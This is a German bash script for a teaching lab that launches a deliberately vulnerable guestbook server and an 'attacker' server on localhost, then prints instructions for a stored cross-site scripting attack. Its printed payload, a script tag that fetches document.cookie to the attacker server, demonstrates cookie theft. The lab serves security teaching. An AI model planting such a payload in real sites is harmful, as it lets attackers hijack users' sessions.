#!/usr/bin/env bash
# =============================================================================
# demo.sh – Labor 8: XSS-Demonstration (Stored XSS / Cookie Theft)
# =============================================================================
# Dieses Skript:
#   1. Installiert npm-Abhängigkeiten beider Server
#   2. Startet den verwundbaren Gästebuch-Server (Port 3000)
#   3. Startet den Angreifer-Server (Port 4000)
#   4. Wartet, bis beide Server erreichbar sind
#   5. Sendet einen Stored-XSS-Payload ans Gästebuch via curl
#   6. Zeigt Anweisungen für den nächsten Schritt
# =============================================================================

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
VULN_DIR="$SCRIPT_DIR/vulnerable-server"
ATK_DIR="$SCRIPT_DIR/attacker-server"

VULN_PID_FILE="/tmp/xss_vuln_server.pid"
ATK_PID_FILE="/tmp/xss_atk_server.pid"

# --------------------------------------------------------------------------
# Hilfsfunktionen
# --------------------------------------------------------------------------
log()  { echo -e "\033[1;34m[INFO]\033[0m  $*"; }
ok()   { echo -e "\033[1;32m[OK]\033[0m    $*"; }
warn() { echo -e "\033[1;33m[WARN]\033[0m  $*"; }
err()  { echo -e "\033[1;31m[ERR]\033[0m   $*" >&2; }

wait_for_port() {
  local port="$1"
  local label="$2"
  local attempts=0
  log "Warte auf $label (Port $port)…"
  until curl -s "http://localhost:$port/" > /dev/null 2>&1; do
    attempts=$((attempts + 1))
    if [ "$attempts" -ge 30 ]; then
      err "$label hat sich nach 15 Sekunden nicht gemeldet."
      exit 1
    fi
    sleep 0.5
  done
  ok "$label ist bereit."
}

cleanup() {
  echo ""
  warn "Beende Server…"
  [ -f "$VULN_PID_FILE" ] && kill "$(cat "$VULN_PID_FILE")" 2>/dev/null && rm -f "$VULN_PID_FILE"
  [ -f "$ATK_PID_FILE"  ] && kill "$(cat "$ATK_PID_FILE")"  2>/dev/null && rm -f "$ATK_PID_FILE"
  ok "Server gestoppt. Auf Wiedersehen!"
}
trap cleanup EXIT INT TERM

# --------------------------------------------------------------------------
# 1. Abhängigkeiten installieren
# --------------------------------------------------------------------------
echo ""
echo "============================================================"
echo "  Labor 8 – Verteilte Systeme: XSS-Demonstration"
echo "============================================================"
echo ""

log "Installiere Abhängigkeiten für verwundbaren Server…"
(cd "$VULN_DIR" && npm install --silent)
ok "Abhängigkeiten installiert: $VULN_DIR"

log "Installiere Abhängigkeiten für Angreifer-Server…"
(cd "$ATK_DIR" && npm install --silent)
ok "Abhängigkeiten installiert: $ATK_DIR"

# --------------------------------------------------------------------------
# 2. Alte Server-Prozesse beenden und Protokoll zurücksetzen
# --------------------------------------------------------------------------
log "Beende alte Server-Prozesse falls vorhanden…"
pkill -f "node server.js" 2>/dev/null || true
sleep 1

log "Setze Protokolldatei zurück…"
echo "=== Gestohlene Cookies – Labor 8 Angreifer-Server ===" > "$ATK_DIR/stolen_cookies.txt"
echo "" >> "$ATK_DIR/stolen_cookies.txt"
ok "stolen_cookies.txt zurückgesetzt."

# --------------------------------------------------------------------------
# 3. Server starten
# --------------------------------------------------------------------------
log "Starte verwundbaren Gästebuch-Server auf Port 3000…"
(cd "$VULN_DIR" && node server.js > /tmp/xss_vuln_server.log 2>&1) &
echo $! > "$VULN_PID_FILE"

log "Starte Angreifer-Server auf Port 4000…"
(cd "$ATK_DIR"  && node server.js > /tmp/xss_atk_server.log  2>&1) &
echo $! > "$ATK_PID_FILE"

# --------------------------------------------------------------------------
# 4. Bereitschaft abwarten
# --------------------------------------------------------------------------
wait_for_port 3000 "Verwundbarer Server"
wait_for_port 4000 "Angreifer-Server"

# --------------------------------------------------------------------------
# 5. Anleitung anzeigen
# --------------------------------------------------------------------------
echo ""
echo "============================================================"
echo "  BEREIT – Jetzt manuell angreifen"
echo "============================================================"
echo ""
echo "  1. Als Opfer einloggen (Cookie setzen):"
echo "       http://localhost:3000/login"
echo ""
echo "  2. Als Angreifer: Payload ins Gästebuch eintragen:"
echo "       http://localhost:3000/"
echo "       Name:      Angreifer"
echo "       Nachricht: <script>fetch('http://localhost:4000/steal?cookie='+btoa(document.cookie))</script>"
echo ""
echo "  3. Als Opfer: Gästebuch öffnen (Inkognito-Fenster):"
echo "       http://localhost:3000/"
echo ""
echo "  4. Gestohlene Cookies anzeigen:"
echo "       http://localhost:4000/"
echo ""
echo "  Drücken Sie Ctrl+C, um beide Server zu beenden."
echo "============================================================"
echo ""

# --------------------------------------------------------------------------
# 6. Live-Log der Server anzeigen
# --------------------------------------------------------------------------
log "Server-Logs (Ctrl+C zum Beenden):"
echo ""
tail -f /tmp/xss_vuln_server.log /tmp/xss_atk_server.log
